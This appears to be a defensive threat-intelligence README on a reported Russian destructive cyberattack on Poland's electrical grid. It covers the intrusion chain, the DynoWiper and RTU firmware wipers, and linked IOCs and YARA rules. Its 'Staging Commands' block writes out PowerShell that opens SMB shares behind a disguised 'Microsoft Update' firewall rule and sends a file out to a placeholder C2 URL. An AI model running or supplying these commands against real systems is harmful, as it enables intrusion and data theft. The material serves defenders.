# Polish Electrical Grid Attack — DragonFly / Ghost Blizzard (Dec 2025)

![TLP:WHITE](https://img.shields.io/badge/TLP-WHITE-white)
![Status](https://img.shields.io/badge/Status-Concluded-orange)
![Attribution](https://img.shields.io/badge/Attribution-High_Confidence-red)

| Field | Value |
|-------|-------|
| **Campaign** | Destructive attack on Polish electrical grid |
| **Threat Actor** | DragonFly / Ghost Blizzard (Russian FSB Center 16) |
| **Date** | 2025-12-29 |
| **Targets** | Polish electrical grid (GCPs), Combined Heat & Power plant (CHP) |
| **Impact** | Worst case: up to 500,000 people without electricity and heating |
| **Significance** | **First destructive cyberattack by Russia on NATO critical infrastructure** |
| **Attribution** | CERT.PL (Polish CERT) |
| **Source** | [Truesec](https://www.truesec.com/hub/blog/detecting-russian-threats-to-critical-energy-infrastructure), [CERT.PL](https://cert.pl/uploads/docs/CERT_Polska_Energy_Sector_Incident_Report_2025.pdf) |

## Summary

On December 29, 2025, DragonFly (Ghost Blizzard / FSB Center 16) conducted a destructive cyberattack on the Polish electrical grid — the **first known destructive cyberattack by a Russian cyber warfare unit on NATO critical infrastructure**. The attack consisted of at least three separate events targeting Grid Connection Points (GCPs) and a Combined Heat & Power plant (CHP). Two wipers were deployed: **DynoWiper** (Mersenne Twister PRNG file overwriter targeting HMI systems) and an **RTU firmware wiper** (corrupted ELF binary with 0xFF entry point). Polish authorities estimated up to 500,000 people could have been affected. Truesec assesses this represents a considerable escalation by Russia and that similar attacks could occur in the Nordics.

## Attack Chain

```
Initial Access
├── FortiGate VPN (CVE-2018-13379) / local account abuse
├── Citrix exploitation (CVE-2019-19781)
├── Exchange exploitation (CVE-2020-0688)
└── Spearphishing (Office docs with SMB forced auth)
    │
    ├── Persistence
    │   ├── Web shells on Exchange/web servers
    │   ├── Local admin accounts (disguised as service accounts)
    │   ├── Registry Run keys
    │   └── FortiGate scripts for credential theft
    │
    ├── Credential Access
    │   ├── SecretsDump → SAM/NTDS/LSA hashes
    │   ├── Mimikatz → Kerberos tickets
    │   ├── Diamond Ticket (Kerberos)
    │   ├── CrackMapExec / Hydra brute force
    │   └── Forced auth via SMB (spearphishing)
    │
    ├── Lateral Movement
    │   ├── Enable SMB admin shares (PowerShell)
    │   ├── Allow inbound SMB (firewall rule "Microsoft Update")
    │   ├── PsExec remote execution
    │   └── RDP to internal systems
    │
    ├── Data Exfiltration
    │   └── PowerShell Invoke-RestMethod HTTP POST
    │       └── Slack webhook exfiltration
    │
    └── Destructive Impact
        ├── DynoWiper → HMI systems (Mersenne Twister PRNG overwrite)
        │   └── Distributed via GPO "Default Domain Policy" + scheduled tasks
        └── RTU Wiper → Firmware corruption (0xFF ELF entry point)
            └── Devices rendered inoperable
```

## Wipers

### DynoWiper (HMI)
- Targets Windows HMI systems
- Uses **Mersenne Twister (MT19937)** PRNG to generate random data for file overwriting
- < 500KB unsigned PE binary
- Distributed via GPO modification ("Default Domain Policy") and scheduled tasks
- Enumerates logical drives, iterates files, sets attributes writable, overwrites, deletes

### RTU Firmware Wiper
- Targets Remote Terminal Units (RTUs) in the electrical grid
- Overwrites firmware with corrupted **ELF binary** where entry point is all `0xFF` bytes
- Renders device completely nonfunctional
- Simple but devastating against field devices

## Staging Commands (PowerShell)

```powershell
# Enable administrative shares
New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters' -Name 'AutoShareWks' -Value 1 -PropertyType DWord -Force
New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters' -Name 'AutoShareServer' -Value 1 -PropertyType DWord -Force

# Restart SMB service
Get-Service LanmanServer | Restart-Service -Verbose -Force

# Allow inbound SMB (misleading rule name)
New-NetFirewallRule -Name 'Microsoft Update' -DisplayName 'Microsoft Update' -Protocol TCP -LocalPort 445 -Action Allow

# Exfiltrate data
Invoke-RestMethod -Uri <C2_URL> -Method Post -InFile <filepath>
```

## Quick Links

| Resource | File |
|----------|------|
| IOCs (CSV) | [iocs.csv](iocs.csv) |
| YARA Rules | [yara/](yara/) |
| MITRE ATT&CK | [mitre_attack.md](mitre_attack.md) |
